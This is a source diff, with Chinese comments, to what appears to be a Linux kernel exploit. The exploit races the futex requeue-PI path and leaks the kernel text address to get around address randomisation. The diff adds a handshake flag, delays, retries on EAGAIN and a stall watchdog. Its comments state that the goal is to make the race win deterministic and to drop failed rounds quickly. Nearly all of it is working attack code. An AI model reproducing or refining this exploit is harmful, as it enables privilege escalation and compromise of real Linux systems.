@@ -19,6 +19,7 @@ static atomic_int slide_owner_started;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
 static atomic_int slide_owner_tid;
+static atomic_int slide_owner_chain_armed; /* mt59: owner 即将排 chain 锁的握手旗 */
 static atomic_int slide_consume_calls;
 static atomic_int slide_consume_go;
 static atomic_int slide_consume_seen;
@@ -530,6 +531,13 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
   }
 
   atomic_store(&slide_owner_started, 1);
+  /* mt59: 先亮 armed 再去排 chain 锁。R2/R3 尸检结论: owner_started=1 到
+   * owner 真正 BLOCK 在 chain LOCK_PI 之间存在微秒窗, main 的 requeue 落进
+   * 窗口 = PI 环不存在 = waiter 在 target 树上泊满 200s = 哑轮 (零打印
+   * 零写入, harness 击杀)。R1 (win 形态) = owner 先排队 → requeue 撞环
+   * → EDEADLK 快路径。armed 旗让 main 等到这一刻再开火。 */
+  atomic_store(&slide_owner_chain_armed, 1);
+  pr_info("mt59: owner armed - blocking on chain mutex\n");
   futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
 
   for (;;) {
@@ -618,12 +626,42 @@ uint64_t slide_child_leak_stext(void) {
     usleep(1000);
   }
 
-  errno = 0;
-  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-           &slide_f_pi_target, 0);
+  /* mt59: 等 owner 把自己排进 chain 锁的 waiters 树后再开火。
+   * armed + 20ms 让排队先落地, 把 R1 的赢法变成确定性的。
+   * 输掉的代价见上注释 (哑轮泊 200s)。 */
+  while (!atomic_load(&slide_owner_chain_armed)) {
+    usleep(1000);
+  }
+  usleep(20000);
 
+  errno = 0;
+  long mt59_rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                          &slide_f_pi_target, 0);
+  /* mt59: EAGAIN = waiter 尚未进入 WAIT_REQUEUE_PI (main 太快的另一半
+   * 竞态) — 重试而不是让整轮哑掉 */
+  for (int mt59_try = 0;
+       mt59_rq != 0 && errno == EAGAIN && mt59_try < 5;
+       mt59_try++) {
+    pr_info("mt59: requeue EAGAIN retry=%d\n", mt59_try + 1);
+    usleep(10000);
+    errno = 0;
+    mt59_rq = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                       &slide_f_pi_target, 0);
+  }
+  pr_info("mt59: requeue fired ret=%ld errno=%d\n", mt59_rq, errno);
+
+  /* mt59: 看门狗。合法路径 requeue→route_done ≤ pselect 超时 (2s) +
+   * 消费风暴数秒。>12s = 竞态输在别处 = 哑轮 — 快速弃轮 (rc=3) 而不是
+   * 泊到 harness 击杀。哑轮的树从未毒化 (无几何 fdset 无 trigger),
+   * waiter 的超时清理走的是普通未毒树路径, 安全。 */
+  time_t mt59_t0 = time(NULL);
   while (!atomic_load(&slide_route_done)) {
-    sleep(1);
+    if (difftime(time(NULL), mt59_t0) > 12.0) {
+      pr_error("mt59: STALL route_done>12s - inert round (lost race), "
+               "aborting rc=3\n");
+      _exit(3);
+    }
+    usleep(100000);
   }
 
   return slide_read_stext();
@@ -770,6 +808,7 @@ void slide_reset_trigger_state(void) {
   atomic_store(&slide_waiter_ready, 0);
   atomic_store(&slide_waiter_waiting, 0);
   atomic_store(&slide_owner_started, 0);
+  atomic_store(&slide_owner_chain_armed, 0); /* mt59 */
   atomic_store(&slide_route_done, 0);
   atomic_store(&slide_consume_go, 0);
   atomic_store(&slide_consume_stop, 0);
